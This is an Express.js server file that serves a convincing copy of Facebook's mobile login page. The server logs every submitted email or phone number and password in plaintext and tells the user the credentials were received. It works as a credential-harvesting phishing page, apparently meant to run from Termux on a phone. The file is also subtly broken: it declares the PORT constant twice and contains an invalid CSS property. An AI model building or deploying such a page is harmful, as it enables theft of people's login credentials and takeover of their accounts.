const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Mobile Login Clone</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #000000; color: #FFFFFF; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 90vh; }
        .logo-container { margin-top: 40px; margin-bottom: 24px; }
        .fb-logo { background-color: #1877f2; width: 60px; height: 60px; border-radius: 50%; display: flex; justify-content: center; align-items: flex-end; overflow: hidden; }
        .fb-logo span { color: #ffffff; font-size: 55px; font-weight: bold; line-height: 0.9; margin-right: -4px; }
        .info-text { font-size: 14px; color: #B0B3B8; text-align: center; margin-bottom: 8px; }
        .link-text { color: #1877f2; text-decoration: none; font-size: 14px; margin-bottom: 30px; }
        .login-form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
        .input-field { width: 100%; background-color: #242526; border: 1px solid #3A3B3C; border-radius: 8px; padding: 16px; color: #FFFFFF; font-size: 15px; outline: none; }
        .input-field::placeholder { color: #8A8D91; }
        .input-field:focus { border-color: #1877f2; }
        .login-btn { background-color: #1877f2; color: #FFFFFF; border: none; border-radius: 25px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 4px; }
        .forgot-password { color: #B0B3B8; text-decoration: none; font-size: 14px; text-align: center; margin-top: 16px; }
        .footer-container { margin-top: auto; padding-top: 40px; width: 100%; display: flex; justifyContent: center; }
        .create-account-btn { background-color: transparent; color: #FFFFFF; border: 1px solid #3A3B3C; border-radius: 20px; padding: 10px 24px; font-size: 14px; font-weight: 600; text-decoration: none; text-align: center; width: 80%; }
        #response-message { margin-top: 12px; font-size: 14px; text-align: center; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-container"><div class="fb-logo"><span>f</span></div></div>
        <p class="info-text">Facebook helps you connect and share with the people in your life.</p>
        <a href="#" class="link-text">Change Settings</a>

        <form class="login-form" id="loginForm">
            <input type="text" id="email" class="input-field" placeholder="Mobile number or email" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>

        <div id="response-message"></div>

        <div class="footer-container">
            <a href="#" class="create-account-btn">Create new account</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const msgEl = document.getElementById('response-message');

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
                const data = await response.json();
                msgEl.style.color = data.success ? '#42b72a' : '#fa383e';
                msgEl.textContent = data.message;
            } catch (err) {
                msgEl.style.color = '#fa383e';
                msgEl.textContent = 'Server connection error.';
            }
        });
    </script>
</body>
</html>
    `);
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    console.log(`[LOGIN ATTEMPT] Email/Phone: ${email} | Password: ${password}`);
    
    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Please fill in all fields.' });
    }

    res.json({ 
        success: true, 
        message: 'Login credentials received by Termux backend!' 
    });
});
const PORT = process.env.PORT || 3000;

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
;

